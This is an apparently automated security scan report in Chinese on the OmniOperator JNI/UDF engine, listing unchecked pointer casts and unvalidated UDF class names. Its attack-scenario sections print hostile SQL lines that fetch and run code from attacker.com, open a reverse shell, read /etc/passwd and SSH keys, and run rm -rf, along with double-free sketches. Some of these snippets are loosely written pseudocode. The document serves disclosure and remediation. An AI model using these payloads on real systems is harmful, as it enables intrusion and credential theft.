# 漏洞扫描报告 — 已确认漏洞

**项目**: OmniOperator  
**扫描时间**: 2026-04-23T07:52:37.639Z  
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

### 项目概述

OmniOperator 是 Kunpeng BoostKit OmniRuntime 的核心运算引擎，通过 JNI 实现 C++ 底层与 Java 上层的交互，为 Spark/Presto 等大数据计算引擎提供高性能运算支持。项目架构包含三个主要模块：

- **bindings/java**: JNI 绑定层，提供 Java 到 C++ 的桥接接口
- **core/udf**: UDF 执行模块，支持 Hive UDF 的 JNI 调用
- **core/operator**: 运算器核心，处理数据流转和表达式解析

### 关键发现

本次扫描共发现 **28 个候选漏洞**，经验证后确认 **14 个为真实漏洞**（置信度 ≥ 85），另有 1 个被判定为误报。已确认漏洞的严重性分布如下：

| 严重性 | 数量 | 占比 | 说明 |
|--------|------|------|------|
| **Critical** | **10** | **71.4%** | 可导致任意代码执行、内存破坏或远程攻击 |
| **High** | **4** | **28.6%** | 可导致内存泄露或类型混淆攻击 |
| **有效漏洞总计** | **14** | - | 需要立即修复 |
| **误报** | **1** | **3.6%** | 已排除 |

### 风险评级

| 风险类别 | 漏洞数量 | 主要影响模块 | CVSS 评分范围 |
|----------|---------|-------------|---------------|
| **任意代码执行** | 4 | udf | 10.0 |
| **指针注入/类型混淆** | 6 | bindings/java | 9.1-9.8 |
| **内存越界/释放** | 4 | bindings/java | 9.8 |

**整体风险评级**: **Critical**

项目存在严重的 JNI 指针注入漏洞和 UDF 类名注入漏洞，攻击者可通过恶意 SQL 查询触发任意 Java 类执行或内存破坏，可能导致：
- 远程代码执行（RCE）
- 数据泄露（读取进程内存、敏感文件）
- 服务拒绝（进程崩溃）
- 权限提升（绕过安全检查）

### 优先修复建议

建议按以下顺序修复漏洞：

1. **紧急修复 (P0)**: VULN-DF-UDF-001/002 和 VULN-SEC-UDF-001/002（任意代码执行，CVSS 10.0）
2. **高优先级 (P1)**: VULN-DF-JNI-001/002/003 和 VULN-SEC-JNI-001/002/003（指针注入，CVSS 9.8）
3. **中等优先级 (P2)**: VULN-DF-JNI-004/005 和 VULN-SEC-HELPER-001（类型混淆）

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| CONFIRMED | 14 | 50.0% |
| LIKELY | 13 | 46.4% |
| FALSE_POSITIVE | 1 | 3.6% |
| **总计** | **28** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 10 | 71.4% |
| High | 4 | 28.6% |
| **有效漏洞总计** | **14** | - |
| 误报 (FALSE_POSITIVE) | 1 | - |

### 1.3 Top 10 关键漏洞

1. **[VULN-DF-JNI-001]** type_confusion (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:159` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative` | 置信度: 85
2. **[VULN-DF-JNI-002]** type_confusion (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:178` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative` | 置信度: 85
3. **[VULN-DF-JNI-003]** type_confusion (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:205` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative` | 置信度: 85
4. **[VULN-DF-UDF-001]** code_injection (Critical) - `core/src/udf/cplusplus/java_udf_functions.cpp:42` @ `ExecuteHiveUdfSingle` | 置信度: 85
5. **[VULN-DF-UDF-002]** code_injection (Critical) - `core/src/udf/cplusplus/java_udf_functions.cpp:166` @ `ExecuteHiveUdfBatch` | 置信度: 85
6. **[VULN-SEC-JNI-001]** pointer_validation_missing (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:159` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative` | 置信度: 85
7. **[VULN-SEC-JNI-002]** pointer_validation_missing (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:178` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative` | 置信度: 85
8. **[VULN-SEC-JNI-003]** pointer_validation_missing (Critical) - `bindings/java/src/main/cpp/src/jni_operator.cpp:205` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative` | 置信度: 85
9. **[VULN-SEC-UDF-001]** arbitrary_code_execution (Critical) - `core/src/udf/cplusplus/java_udf_functions.cpp:42` @ `ExecuteHiveUdfSingle` | 置信度: 85
10. **[VULN-SEC-UDF-002]** arbitrary_code_execution (Critical) - `core/src/udf/cplusplus/java_udf_functions.cpp:166` @ `ExecuteHiveUdfBatch` | 置信度: 85

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `undefined@bindings/java/src/main/cpp/src/jni_operator.cpp` | JNI | - | - | JNI entry point for adding input data to operator |
| `undefined@bindings/java/src/main/cpp/src/jni_operator.cpp` | JNI | - | - | JNI entry point for getting output from operator |
| `undefined@bindings/java/src/main/cpp/src/jni_operator_factory.cpp` | JNI | - | - | JNI entry point for creating operator factories |
| `undefined@bindings/java/src/main/cpp/src/jni_operator_factory.cpp` | JNI | - | - | JNI entry point creating filter/project operator with expression parsing |
| `undefined@core/src/expression/jsonparser/jsonparser.cpp` | Parser | - | - | JSON expression parser for query predicates |
| `undefined@core/src/udf/cplusplus/java_udf_functions.cpp` | UDF | - | - | Execute Hive UDF via JNI with single row |
| `undefined@core/src/udf/cplusplus/java_udf_functions.cpp` | UDF | - | - | Execute Hive UDF via JNI with batch data |
| `undefined@core/src/operator/config/operator_config.cpp` | Configuration | - | - | Deserialize operator configuration from JSON |
| `undefined@core/src/type/data_type_serializer.cpp` | Parser | - | - | Deserialize data types from JSON string |
| `undefined@bindings/java/src/main/cpp/src/jni_operator.cpp` | JNI | - | - | Parse row data from byte array via JNI |


---

## 3. Critical 漏洞 (10)

### [VULN-DF-JNI-001] type_confusion - Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative

**严重性**: Critical | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:159-171` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative`
**模块**: bindings/java

**描述**: Unsafe pointer cast from jlong to VectorBatch* without validation in addInputNative JNI entry point. The jlong parameter jVecBatchAddress is directly cast to VectorBatch* using reinterpret_cast without any validation. A malicious Java caller could pass an invalid address leading to memory corruption, arbitrary read/write, or crash.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:159-171`)

```c
auto *vecBatch = reinterpret_cast<VectorBatch *>(jVecBatchAddress);
auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddress);
```

**达成路径**

JNI jlong jVecBatchAddress [SOURCE] -> reinterpret_cast<VectorBatch*> -> Operator::SetInputVecBatch(vecBatch) [SINK]

**验证说明**: JNI entry point directly casts jlong to VectorBatch* and Operator* without any validation. Attacker can pass arbitrary pointer values leading to memory corruption or arbitrary read/write. Verified in source code: jni_operator.cpp lines 163-164 use reinterpret_cast on external jlong input.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**CVSS 评分**: 9.8 (Critical)

### 深度分析 — 攻击场景

#### 场景 1: 内存任意读取

攻击者通过 Java 代码传入精心构造的地址值，触发对任意内存位置的读取：

```java
// 恶意 Java 代码
OmniOperator operator = getOperator();
// 尝试读取内核内存地址
long fakeVecBatchAddr = 0xffffffff80000000L;
operator.addInputNative(operator.getNativeAddress(), fakeVecBatchAddr);
// VectorBatch 虚函数表指针被读取，可能泄露目标地址内容
```

#### 场景 2: 虚函数表劫持

攻击者构造假的 VectorBatch 对象，篡改虚函数表指针实现控制流劫持：

```cpp
struct FakeVectorBatch {
    void* vtable;  // 攻击者构造的虚表指针指向 shellcode
};
// 当调用 vecBatch->GetVectorCount() 时，控制流被劫持
```

#### 场景 3: DoS 攻击

传入无效地址导致 JVM 进程崩溃：

```java
operator.addInputNative(0xDEADBEEF, 0x0);  // 无效地址 → JVM 崩溃
```

### 业务影响

- **数据泄露**: 可读取加密密钥、用户凭证、内部数据结构
- **权限提升**: 通过修改内存中的权限检查逻辑绕过安全限制
- **远程代码执行**: 在适当的内存布局下，可实现 shellcode 执行
- **服务拒绝**: 导致 Spark/Presto 计算引擎崩溃，影响业务连续性

---

### [VULN-DF-JNI-002] type_confusion - Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative

**严重性**: Critical | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:178-198` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative`
**模块**: bindings/java

**描述**: Unsafe pointer cast from jlong to Operator* without validation in getOutputNative JNI entry point. The jOperatorAddr parameter is directly cast without validation, allowing potential type confusion and memory corruption if a malicious address is passed.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:178-198`)

```c
auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddr);
```

**达成路径**

JNI jlong jOperatorAddr [SOURCE] -> reinterpret_cast<Operator*> -> nativeOperator->GetOutput() [SINK]

**验证说明**: JNI entry point directly casts jlong to Operator* without validation. Memory corruption possible. Verified: jni_operator.cpp line 187.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**CVSS 评分**: 9.1 (Critical)

### 深度分析 — 攻击场景

#### 场景 1: 虚函数表劫持

攻击者在内存中构造假的 Operator 对象，篡改虚函数表指针：

```java
// 分配内存并构造假对象
long fakeOperatorAddr = allocateFakeOperator();
// 设置假的虚函数表指针指向 shellcode
writeVirtualTablePointer(fakeOperatorAddr, shellcodeAddr);
// 调用 getOutputNative 触发虚函数调用
OmniOperator fakeOperator = new OmniOperator(fakeOperatorAddr);
OmniResults results = fakeOperator.getOutputNative();
// GetOutput() 虚函数被调用时，控制流被劫持
```

#### 场景 2: 内存泄露

通过多次调用扫描进程内存布局：

```java
for (long addr = 0x1000; addr < 0xFFFFFFFF; addr += 0x1000) {
    try {
        OmniOperator fakeOp = new OmniOperator(addr);
        OmniResults results = fakeOp.getOutputNative();
        // 如果没有崩溃，说明 addr 是可读地址
    } catch (Exception e) {
        // 地址无效，继续扫描
    }
}
```

#### 场景 3: 状态值泄露

nativeOperator->GetStatus() 会读取内存，攻击者可读取敏感数据：

```cpp
// 如果 Operator 对象的 status_ 字段位于偏移 0x20
// 攻击者可以读取 target_addr + 0x20 的内容
```

### 业务影响

- **虚表劫持**: 可实现任意代码执行
- **内存泄露**: 可读取进程内存任意位置
- **信息泄露**: GetStatus() 返回值可能泄露敏感数据
- **进程崩溃**: 传入无效地址导致崩溃

---

### [VULN-DF-JNI-003] type_confusion - Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative

**严重性**: Critical | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:205-214` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative`
**模块**: bindings/java

**描述**: Unsafe pointer cast from jlong to Operator* in closeNative JNI entry point without validation. Invalid pointer could lead to use-after-free if delete is called on a wrong address.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:205-214`)

```c
auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddr);
op::Operator::DeleteOperator(nativeOperator);
```

**达成路径**

JNI jlong jOperatorAddr [SOURCE] -> reinterpret_cast<Operator*> -> Operator::DeleteOperator [SINK]

**验证说明**: JNI entry point directly casts jlong to Operator* and calls DeleteOperator. Use-after-free or arbitrary memory deallocation possible. Verified: jni_operator.cpp line 209.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**CVSS 评分**: 9.8 (Critical)

### 深度分析 — 攻击场景

#### 场景 1: Double-Free 攻击

攻击者多次调用 closeNative 实现经典的 double-free 漏洞利用：

```java
OmniOperator operator = getOperator();
long operatorAddr = operator.getNativeAddress();

// 第一次关闭 - 正常释放
operator.closeNative();

// 第二次关闭 - double-free
operator.closeNative();  // operatorAddr 指向已释放内存

// 堆管理器状态被破坏
// 后续内存分配可能返回攻击者控制区域的内存
```

#### 场景 2: Arbitrary Free

释放栈内存或其他合法对象的内存：

```java
// 尝试释放栈上的内存
long stackAddr = getStackAddress();
OmniOperator fakeOperator = new OmniOperator(stackAddr);
fakeOperator.closeNative();  // 释放栈内存 → 未定义行为

// 或释放其他合法对象
SomeObject other = getSomeObject();
long otherAddr = getOtherObjectAddress(other);
OmniOperator fakeOp = new OmniOperator(otherAddr);
fakeOp.closeNative();  // 错误释放其他对象 → use-after-free
```

#### 场景 3: 堆喷射结合攻击

攻击者通过堆喷射布置特定数据结构，配合 closeNative 释放：

```cpp
// 步骤 1: 堆喷射
for (int i = 0; i < 10000; i++) {
    allocateMemoryWithSpecificPattern();
}

// 步骤 2: 找到喷射区域中的目标地址并释放
long targetAddr = findTargetInSprayedMemory();
OmniOperator fakeOp = new OmniOperator(targetAddr);
fakeOp.closeNative();

// 步骤 3: 新分配可能返回攻击者控制的内存
Operator* newOp = OperatorFactory::CreateOperator();
// newOp 可能指向攻击者布置的数据结构
```

### 业务影响

- **Double-Free**: 经典漏洞模式，可导致代码执行
- **任意内存释放**: 破坏堆状态，影响后续所有内存操作
- **堆破坏**: 堆管理器元数据被破坏
- **Use-After-Free**: 与其他漏洞组合可实现完整利用链

---

### [VULN-DF-UDF-001] code_injection - ExecuteHiveUdfSingle

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `core/src/udf/cplusplus/java_udf_functions.cpp:42-73` @ `ExecuteHiveUdfSingle`
**模块**: udf
**跨模块**: udf → codegen

**描述**: UDF class name from external input passed to JVM without validation for arbitrary code execution. The udfClass parameter comes from user-provided data and is directly used to invoke Java UDF execution via CallStaticVoidMethod. No whitelist or validation of the class name allows potential arbitrary class loading and execution.

**漏洞代码** (`core/src/udf/cplusplus/java_udf_functions.cpp:42-73`)

```c
jstring jUdfClassName = env->NewStringUTF(udfClass);
env->CallStaticVoidMethod(executorCls, executeSingleMethod, jUdfClassName, ...);
```

**达成路径**

const char *udfClass [SOURCE] -> NewStringUTF -> CallStaticVoidMethod (executeSingle) [SINK - External Code Execution]

**验证说明**: udfClass parameter directly passed to JVM without whitelist validation. Attacker can execute arbitrary Java class. Verified: java_udf_functions.cpp line 55-66 creates jstring from udfClass and calls CallStaticVoidMethod.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

**CVSS 评分**: 10.0 (Critical)

### 深度分析 — 攻击场景

#### 场景 1: 任意 Java 类执行

攻击者通过 SQL 查询定义恶意 UDF 类名，执行任意 Java 类：

```sql
-- 恶意 SQL 查询
CREATE TEMPORARY FUNCTION exploit AS 'java.lang.Runtime';

SELECT exploit('exec', 'rm -rf /tmp/*') FROM some_table;
-- 或更危险的：
SELECT exploit('exec', 'curl attacker.com/malware.sh | bash') FROM some_table;
```

#### 场景 2: 文件系统操作

使用 Java IO 类读取敏感文件：

```sql
-- 使用 Java IO 类读取敏感文件
CREATE TEMPORARY FUNCTION read_file AS 'java.io.FileInputStream';

SELECT read_file('/etc/passwd') FROM some_table;
-- 或读取配置文件中的密码
SELECT read_file('/app/config/database.properties') FROM some_table;
```

#### 场景 3: 网络攻击

建立反向连接：

```sql
-- 使用 Java Socket 类建立反向连接
CREATE TEMPORARY FUNCTION connect AS 'java.net.Socket';

SELECT connect('attacker.com', 4444) FROM some_table;
-- 建立反向 shell 连接
```

#### 场景 4: 反序列化攻击

加载恶意类进行反序列化攻击：

```sql
-- 加载恶意类进行反序列化攻击
CREATE TEMPORARY FUNCTION deserialize AS 'org.apache.commons.collections.functors.InvokerTransformer';

SELECT deserialize(malicious_payload) FROM some_table;
-- 利用已知反序列化漏洞库实现 RCE
```

### 数据流分析

```
用户 SQL 查询 (定义 UDF)
    ↓
Spark/Presto 解析
    ↓
UDF 类名提取 (udfClass 参数)
    ↓
ExecuteHiveUdfSingle(const char *udfClass, ...)  [无验证]
    ↓
NewStringUTF(udfClass) → jstring
    ↓
CallStaticVoidMethod(executorCls, executeSingleMethod, jUdfClassName, ...)
    ↓
Java: HiveUdfExecutor.executeSingle(jUdfClassName, ...)
    ↓
Class.forName(jUdfClassName) / 类加载 / 方法调用
    ↓
任意 Java 类代码执行
```

### 业务影响

- **任意代码执行**: 可执行任意 Java 类的任意方法
- **文件读写**: 可读写服务器任意文件
- **网络连接**: 可建立反向 shell
- **数据泄露**: 可读取数据库配置、密码等
- **权限提升**: 可调用安全管理器相关类

---

### [VULN-DF-UDF-002] code_injection - ExecuteHiveUdfBatch

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `core/src/udf/cplusplus/java_udf_functions.cpp:166-177` @ `ExecuteHiveUdfBatch`
**模块**: udf
**跨模块**: udf → codegen

**描述**: UDF class name injection in batch execution. Similar to ExecuteHiveUdfSingle, the udfClass parameter is passed directly to JVM without validation, allowing potential arbitrary Java class execution.

**漏洞代码** (`core/src/udf/cplusplus/java_udf_functions.cpp:166-177`)

```c
jstring jUdfClassName = env->NewStringUTF(udfClass);
env->CallStaticVoidMethod(executorCls, executeBatchMethod, jUdfClassName, ...);
```

**达成路径**

const char *udfClass [SOURCE] -> NewStringUTF -> CallStaticVoidMethod (executeBatch) [SINK - External Code Execution]

**验证说明**: Same as VULN-DF-UDF-001: udfClass directly passed to JVM for batch execution without validation.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

**CVSS 评分**: 10.0 (Critical)

### 深度分析 — 批量执行的额外风险

#### 与 ExecuteHiveUdfSingle 的对比

| 特性 | ExecuteHiveUdfSingle | ExecuteHiveUdfBatch |
|------|---------------------|---------------------|
| 执行模式 | 单行逐条执行 | 批量处理多行 |
| JVM 调用方法 | `executeSingle` | `executeBatch` |
| 性能影响 | 较低（适合小数据量） | 较高（适合大数据量） |
| 攻击效率 | 单次执行一条命令 | 单次执行多条命令 |

#### 场景 1: 批量数据窃取

批量读取大量文件，攻击效率更高：

```sql
-- 利用批量执行高效读取大量文件
CREATE TEMPORARY FUNCTION batch_read AS 'java.io.FileInputStream';

-- 批量读取所有用户的配置文件
SELECT batch_read('/home/' || username || '/.ssh/id_rsa') 
FROM users 
WHERE username IN ('admin', 'root', 'operator');
-- 一次批量执行窃取多个 SSH 私钥
```

#### 场景 2: 批量命令执行

在批量处理中执行大量命令：

```sql
CREATE TEMPORARY FUNCTION batch_cmd AS 'java.lang.Runtime';

SELECT batch_cmd('exec', 'wget attacker.com/malware' || id || '.sh') 
FROM large_table;
-- 执行大量下载命令
```

#### 场景 3: 批量网络扫描

探测内网端口：

```sql
-- 批量探测内网端口
CREATE TEMPORARY FUNCTION scan_port AS 'java.net.Socket';

SELECT scan_port('10.0.0.' || subnet || '.' || host, port) 
FROM ip_ranges, port_list;
-- 批量扫描内网可达性
```

### 批量模式的额外风险

- **攻击效率提升**: 批量处理可在短时间内执行大量攻击
- **资源消耗放大**: 每次批量调用消耗更多 JVM 资源
- **隐蔽性增强**: 批量查询更难被实时检测
- **数据窃取效率**: 可一次性窃取大量敏感数据

---

### [VULN-SEC-JNI-001] pointer_validation_missing - Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative

**严重性**: Critical | **CWE**: CWE-787 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:159-170` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative`
**模块**: bindings/java

**描述**: JNI入口点addInputNative直接将jlong转换为VectorBatch和Operator指针，没有任何验证机制。攻击者可以注入任意指针值，导致内存访问违规或代码执行。

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:159-170`)

```c
JNIEXPORT jint JNICALL Java_nova_hetu_omniruntime_operator_OmniOperator_addInputNative(JNIEnv *env, jobject jObj,
    jlong jOperatorAddress, jlong jVecBatchAddress)
{
    int32_t errNo = 0;
    auto *vecBatch = reinterpret_cast<VectorBatch *>(jVecBatchAddress);
    auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddress);
```

**达成路径**

External (Java jlong) -> reinterpret_cast -> Native pointer -> AddInput()

**验证说明**: Same vulnerability as VULN-DF-JNI-001: JNI addInputNative casts jlong to pointers without validation. Verified in source.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-JNI-002] pointer_validation_missing - Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative

**严重性**: Critical | **CWE**: CWE-787 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:178-198` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative`
**模块**: bindings/java

**描述**: JNI入口点getOutputNative直接将jlong转换为Operator指针，没有验证。可能导致内存泄露或任意内存访问。

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:178-198`)

```c
JNIEXPORT jobject JNICALL Java_nova_hetu_omniruntime_operator_OmniOperator_getOutputNative(JNIEnv *env, jobject jObj,
    jlong jOperatorAddr)
{
    auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddr);
```

**达成路径**

External (Java jlong) -> reinterpret_cast -> Native pointer -> GetOutput()

**验证说明**: Same vulnerability as VULN-DF-JNI-002: JNI getOutputNative pointer cast without validation.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-JNI-003] pointer_validation_missing - Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative

**严重性**: Critical | **CWE**: CWE-787 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:205-214` @ `Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative`
**模块**: bindings/java

**描述**: JNI入口点closeNative直接将jlong转换为Operator指针并删除，没有验证。可能导致任意内存释放(double-free或释放非法内存)。

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:205-214`)

```c
JNIEXPORT void JNICALL Java_nova_hetu_omniruntime_operator_OmniOperator_closeNative(JNIEnv *env, jobject jObj,
    jlong jOperatorAddr)
{
    try {
        auto *nativeOperator = reinterpret_cast<op::Operator *>(jOperatorAddr);
        op::Operator::DeleteOperator(nativeOperator);
```

**达成路径**

External (Java jlong) -> reinterpret_cast -> Native pointer -> DeleteOperator()

**验证说明**: Same vulnerability as VULN-DF-JNI-003: JNI closeNative pointer cast and deletion without validation.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-UDF-001] arbitrary_code_execution - ExecuteHiveUdfSingle

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `core/src/udf/cplusplus/java_udf_functions.cpp:42-73` @ `ExecuteHiveUdfSingle`
**模块**: udf

**描述**: ExecuteHiveUdfSingle函数接收udfClass参数，直接使用用户提供的类名通过JVM执行Java代码。没有类名白名单验证机制，攻击者可以执行任意Java类。

**漏洞代码** (`core/src/udf/cplusplus/java_udf_functions.cpp:42-73`)

```c
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, int32_t *inputTypes, int32_t retType,
    int32_t vecCount, int64_t inputValueAddr, ...) {
    ...
    jstring jUdfClassName = env->NewStringUTF(udfClass);
    env->CallStaticVoidMethod(executorCls, executeSingleMethod, jUdfClassName, ...);
```

**达成路径**

External (udfClass string) -> NewStringUTF -> CallStaticVoidMethod -> HiveUdfExecutor.executeSingle

**验证说明**: Same vulnerability as VULN-DF-UDF-001: ExecuteHiveUdfSingle udfClass injection.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

### [VULN-SEC-UDF-002] arbitrary_code_execution - ExecuteHiveUdfBatch

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `core/src/udf/cplusplus/java_udf_functions.cpp:166-177` @ `ExecuteHiveUdfBatch`
**模块**: udf

**描述**: ExecuteHiveUdfBatch函数批量执行UDF，同样接收udfClass参数无验证。攻击者可通过批量执行方式触发任意Java类执行。

**漏洞代码** (`core/src/udf/cplusplus/java_udf_functions.cpp:166-177`)

```c
void ExecuteHiveUdfBatch(int64_t contextPtr, const char *udfClass, int32_t *inputTypes, int32_t retType,
    int32_t vecCount, int32_t rowCount, ...) {
    if (TypeUtil::IsStringType(static_cast<type::DataTypeId>(retType))) {
        ExecHiveUdfOutputString(contextPtr, udfClass, ...);
```

**达成路径**

External (udfClass string) -> ExecHiveUdfOutputString/ExecHiveUdfOutputNonString -> JVM execution

**验证说明**: Same vulnerability as VULN-DF-UDF-002: ExecuteHiveUdfBatch udfClass injection.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

## 4. High 漏洞 (4)

### [VULN-DF-JNI-004] type_confusion - Java_nova_hetu_omniruntime_vector_serialize_OmniRowDeserializer_parseOneRow

**严重性**: High | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_operator.cpp:348-356` @ `Java_nova_hetu_omniruntime_vector_serialize_OmniRowDeserializer_parseOneRow`
**模块**: bindings/java

**描述**: Unsafe pointer cast in parseOneRow JNI entry point. The parserAddr and row parameters are cast without validation, potentially leading to memory corruption if invalid addresses are passed from Java.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator.cpp:348-356`)

```c
auto *row = env->GetByteArrayElements(bytes, &isCopy);
auto *parser = reinterpret_cast<RowParser *>(parserAddr);
parser->ParseOnRow(reinterpret_cast<uint8_t *>(row), rowIndex);
```

**达成路径**

JNI jbyteArray bytes [SOURCE] -> GetByteArrayElements -> reinterpret_cast<uint8_t*> -> RowParser::ParseOnRow [SINK]

**验证说明**: parserAddr and bytes both cast without validation in parseOneRow. Verified: jni_operator.cpp lines 352-354.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

### [VULN-DF-JNI-005] type_confusion - Java_nova_hetu_omniruntime_utils_ShuffleHashHelper_computePartitionIds

**严重性**: High | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_helper.cpp:8-25` @ `Java_nova_hetu_omniruntime_utils_ShuffleHashHelper_computePartitionIds`
**模块**: bindings/java

**描述**: Unsafe pointer cast in computePartitionIds JNI helper. The vecAddrArray elements are cast to BaseVector* without validation, potentially corrupting memory.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_helper.cpp:8-25`)

```c
jlong *addrs = (*env).GetLongArrayElements(vecAddrArray, nullptr);
auto vec = reinterpret_cast<omniruntime::vec::BaseVector *>(addrs[i]);
```

**达成路径**

JNI jlongArray vecAddrArray [SOURCE] -> GetLongArrayElements -> reinterpret_cast<BaseVector*> -> HashUtil::ComputePartitionIds [SINK]

**验证说明**: vecAddrArray elements directly cast to BaseVector* without validation. Memory corruption possible. Verified: jni_helper.cpp lines 16-19.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

### [VULN-DF-TYPE-001] type_confusion - Java_nova_hetu_omniruntime_operator_OmniOperatorFactory_createOperatorNative

**严重性**: High | **CWE**: CWE-843 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `bindings/java/src/main/cpp/src/jni_operator_factory.cpp:156-171` @ `Java_nova_hetu_omniruntime_operator_OmniOperatorFactory_createOperatorNative`
**模块**: bindings/java

**描述**: C-style cast without validation in createOperatorNative JNI entry point. The jNativeFactoryObj is cast to OperatorFactory* using C-style cast without any validation.

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_operator_factory.cpp:156-171`)

```c
auto operatorFactory = (OperatorFactory *)jNativeFactoryObj;
```

**达成路径**

JNI jlong jNativeFactoryObj [SOURCE] -> (OperatorFactory*) cast -> CreateOperator [SINK]

**验证说明**: C-style cast without validation in createOperatorNative. Verified: jni_operator_factory.cpp line 159.

**评分明细**: base: 30 | controllability: 25 | context: 0 | cross_file: 0 | mitigations: 0 | reachability: 30

---

### [VULN-SEC-HELPER-001] pointer_validation_missing - Java_nova_hetu_omniruntime_utils_ShuffleHashHelper_computePartitionIds

**严重性**: High | **CWE**: CWE-787 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `bindings/java/src/main/cpp/src/jni_helper.cpp:8-25` @ `Java_nova_hetu_omniruntime_utils_ShuffleHashHelper_computePartitionIds`
**模块**: bindings/java

**描述**: jni_helper.cpp中computePartitionIds直接将jlong数组转换为BaseVector指针数组，没有验证指针有效性。

**漏洞代码** (`bindings/java/src/main/cpp/src/jni_helper.cpp:8-25`)

```c
JNIEXPORT jlong JNICALL Java_nova_hetu_omniruntime_utils_ShuffleHashHelper_computePartitionIds(JNIEnv *env,
